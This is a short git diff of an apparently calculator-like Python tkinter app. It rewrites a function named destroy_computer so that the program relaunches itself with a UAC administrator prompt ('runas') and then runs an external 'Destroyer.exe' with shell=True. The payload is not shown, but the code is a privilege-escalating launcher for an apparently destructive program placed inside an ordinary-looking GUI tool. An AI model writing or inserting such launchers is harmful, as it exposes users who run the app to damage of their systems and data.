@@ -1,5 +1,9 @@
 import tkinter as tk
 import os
+import subprocess
+import sys
+import ctypes
+
 
 
 def delete_text():
@@ -24,8 +28,14 @@ def delete_text():
 
 
 def destroy_computer():
-    os.startfile("Destroyer.exe")
-    window.destroy()
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+    else:
+        try:
+            subprocess.run("Destroyer.exe", shell=True)
+        except FileNotFoundError:
+            print("Error: Destroyer.exe not found")
+
 
 
 def handle_button_click(button_text):
